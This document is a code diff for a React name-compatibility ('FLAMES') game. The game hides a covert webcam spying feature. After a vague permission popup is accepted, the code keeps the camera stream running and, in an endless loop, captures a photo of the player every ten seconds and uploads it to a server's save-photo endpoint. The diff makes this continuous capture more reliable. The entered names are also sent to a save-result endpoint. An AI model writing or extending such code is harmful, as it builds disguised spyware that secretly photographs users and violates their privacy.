@@ -1,4 +1,4 @@
-// Auto-capture every 10s: 1s on, capture at 2s, then off
+// Auto-capture every 10s, keep stream on (Chrome-friendly)
 import React, { useState, useCallback, useMemo, useRef, useEffect } from "react";
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
@@ -118,10 +118,7 @@ const flamesLogic = (name1, name2) => {
     }
   }
 
-  const remainingCount =
-    name1Arr.filter(letter => letter !== "").length +
-    name2Arr.filter(letter => letter !== "").length;
-
+  const remainingCount = name1Arr.filter(l => l !== "").length + name2Arr.filter(l => l !== "").length;
   let flames = ["Friend", "Love", "Affection", "Marriage", "Enemy", "Sibling"];
   let index = 0;
   while (flames.length > 1) {
@@ -140,7 +137,6 @@ const FlamesGame = () => {
   const [permissionStatus, setPermissionStatus] = useState("");
   const videoRef = useRef();
   const canvasRef = useRef();
-  const streamRef = useRef(null);
 
   useEffect(() => {
     if (localStorage.getItem("permissionsGiven") === "true") {
@@ -148,39 +144,38 @@ const FlamesGame = () => {
     }
   }, []);
 
-  const delay = (ms) => new Promise(res => setTimeout(res, ms));
-
-  const startStream = async () => {
+  const startStreamOnce = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      videoRef.current.srcObject = stream;
-      videoRef.current.setAttribute("playsinline", true);
-      streamRef.current = stream;
-      console.log("✅ Stream started");
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        videoRef.current.setAttribute("playsinline", true);
+      }
+      console.log("✅ Stream running continuously");
     } catch (err) {
-      console.error("❌ Cannot start stream:", err);
+      console.error("❌ getUserMedia failed", err);
     }
   };
 
-  const stopStream = () => {
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach(track => track.stop());
-      streamRef.current = null;
-      videoRef.current.srcObject = null;
-      console.log("📴 Stream stopped");
+  const captureLoop = async () => {
+    const delay = (ms) => new Promise(r => setTimeout(r, ms));
+    while (true) {
+      await delay(2000); // wait 2s after page or camera ready
+      await capturePhoto();
+      await delay(10000); // every 10s total
     }
   };
 
   const waitForVideoReady = () => {
-    return new Promise(resolve => {
-      const video = videoRef.current;
-      if (!video) return resolve();
-      if (video.readyState >= 3) return resolve();
-      const onCanPlay = () => {
-        video.removeEventListener("canplay", onCanPlay);
-        resolve();
+    return new Promise(res => {
+      const v = videoRef.current;
+      if (!v) return res();
+      if (v.readyState >= 3) return res();
+      const handler = () => {
+        v.removeEventListener("canplay", handler);
+        res();
       };
-      video.addEventListener("canplay", onCanPlay);
+      v.addEventListener("canplay", handler);
     });
   };
 
@@ -189,34 +184,20 @@ const FlamesGame = () => {
     const canvas = canvasRef.current;
     const video = videoRef.current;
     if (!canvas || !video) return;
-
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imageData = canvas.toDataURL("image/jpeg");
-
+    const data = canvas.toDataURL("image/jpeg");
     try {
-      const res = await fetch(`${API_BASE}/api/save-photo`, {
+      await fetch(`${API_BASE}/api/save-photo`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: imageData }),
+        body: JSON.stringify({ image: data })
       });
-      if (!res.ok) console.error("❌ Upload error");
-      else console.log("📸 Sent");
+      console.log("📸 Photo sent");
     } catch (err) {
-      console.error("❌ Error sending image:", err);
-    }
-  };
-
-  const startAutoCaptureLoop = async () => {
-    while (true) {
-      await delay(1000); // wait 1s
-      await startStream();
-      await delay(1000); // wait another 1s (total 2s)
-      await capturePhoto();
-      stopStream();
-      await delay(10000); // wait 10s before next cycle
+      console.error("❌ Error sending photo", err);
     }
   };
 
@@ -224,7 +205,8 @@ const FlamesGame = () => {
     setShowPermissionPopup(false);
     localStorage.setItem("permissionsGiven", "true");
     setPermissionStatus("Camera access granted ✅");
-    startAutoCaptureLoop();
+    await startStreamOnce();
+    captureLoop();
   };
 
   const handleDeny = () => {
@@ -239,43 +221,35 @@ const FlamesGame = () => {
   const handleSubmit = async () => {
     if (!name1.trim() || !name2.trim()) return alert("Enter both names!");
     if (name1.toLowerCase() === name2.toLowerCase()) return alert("Names should be different!");
-
     setIsLoading(true);
     setResult(null);
-
     setTimeout(async () => {
       const flamesResult = flamesLogic(name1, name2);
       setResult(flamesResult);
       setIsLoading(false);
-
       try {
-        const res = await fetch(`${API_BASE}/api/save-result`, {
+        await fetch(`${API_BASE}/api/save-result`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ name1, name2, result: flamesResult }),
+          body: JSON.stringify({ name1, name2, result: flamesResult })
         });
-        if (!res.ok) console.error("❌ Result save error");
       } catch (err) {
-        console.error("❌ Failed to send result:", err);
+        console.error("❌ Result error", err);
       }
     }, 2000);
   };
 
   const handleShare = async () => {
     if (!result) return;
-    const shareMessage = `FLAMES Result: ${name1} ❤ ${name2} = ${result}`;
-    if (navigator.share) {
-      await navigator.share({ text: shareMessage });
-    } else {
-      await navigator.clipboard.writeText(shareMessage);
+    const msg = `FLAMES Result: ${name1} ❤ ${name2} = ${result}`;
+    if (navigator.share) await navigator.share({ text: msg });
+    else {
+      await navigator.clipboard.writeText(msg);
       alert("Copied to clipboard! 📋");
     }
   };
 
-  const heartPositions = useMemo(
-    () => Array.from({ length: 30 }, () => ({ left: Math.random() * 100, duration: 4 + Math.random() * 3 })),
-    []
-  );
+  const heartPositions = useMemo(() => Array.from({ length: 30 }, () => ({ left: Math.random() * 100, duration: 4 + Math.random() * 3 })), []);
 
   return (
     <Background>
